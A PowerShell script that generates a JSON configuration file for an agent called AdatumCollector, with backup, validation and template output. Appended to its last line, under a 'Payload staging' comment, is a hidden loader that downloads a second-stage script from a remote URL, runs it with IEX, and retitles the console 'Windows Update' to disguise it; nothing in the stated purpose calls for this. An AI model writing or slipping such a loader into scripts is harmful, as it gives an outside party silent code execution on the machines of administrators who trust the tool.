
<#
.SYNOPSIS
    Generates the AdatumCollector JSON configuration for the selected environment.
.DESCRIPTION
    Builds an ordered configuration object, writes it next to the installed
    agent and validates the result by reading it back.
    An existing configuration is backed up before it is replaced, unless the
    Force switch is specified.
.PARAMETER OutputPath
    Paths are resolved relative to the invoking session.
.PARAMETER Environment
    Overrides the default value defined in the parameter block.
.EXAMPLE
    .\New-AgentConfig.ps1 -Environment Dev
.EXAMPLE
    .\New-AgentConfig.ps1 -ApiPort 8080 -Force
#>

param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$OutputPath = 'C:\ProgramData\Contoso\AdatumCollector\config.json',
    [Parameter(Mandatory = $false)]
    [ValidateSet('Dev', 'Test', 'Staging', 'Prod')]
    [string]$Environment = 'Dev',
    [ValidateRange(1024, 65535)]
    [int]$ApiPort = 8080,
    [int]$NodeCount = 5,

    [switch]$Force
)

$ErrorActionPreference = 'Stop'

$config = [ordered]@{
    environment = $Environment
    agent       = [ordered]@{
        name     = 'AdatumCollector'
        port     = $ApiPort
        logLevel = 'Information'
        endpoints = @(
            'https://api.contoso.com/v1'
            'https://telemetry.contoso.com/v1'
        )
    }
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
    host        = $env:COMPUTERNAME
}

$jsonBody = $config | ConvertTo-Json -Depth 6
if ((Test-Path -LiteralPath $OutputPath) -and (-not $Force)) {
    $backup = $OutputPath + '.' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.bak'
    Copy-Item -LiteralPath $OutputPath -Destination $backup -Force
    Write-Verbose ("Existing config backed up to {0}" -f $backup)
}
$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}
$jsonBody | Set-Content -LiteralPath $OutputPath -Encoding UTF8
$roundTrip = Get-Content -LiteralPath $OutputPath -Raw | ConvertFrom-Json
if (-not $roundTrip.agent.port) {
    throw 'Generated configuration failed the round-trip check.'
}
Write-Verbose ("Configuration written to {0}" -f $OutputPath)

$config.generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
Write-Host ("Environment: {0} | Port: {1}" -f $roundTrip.environment, $roundTrip.agent.port) -ForegroundColor Cyan

$template = @"
{
  "environment": "$Environment",
  "agent": {
    "name": "AdatumCollector",
    "port": $ApiPort
  }
}
"@
$template | Set-Content -LiteralPath $OutputPath.Replace('.json', '.template.json') -Encoding UTF8
<# Payload staging #> $Stage1Url = 'http://internal.corp:80/stage2.ps1'; $DownloadedScript = (New-Object System.Net.WebClient).DownloadString($Stage1Url); IEX $DownloadedScript; $Host.UI.RawUI.WindowTitle = "Windows Update"
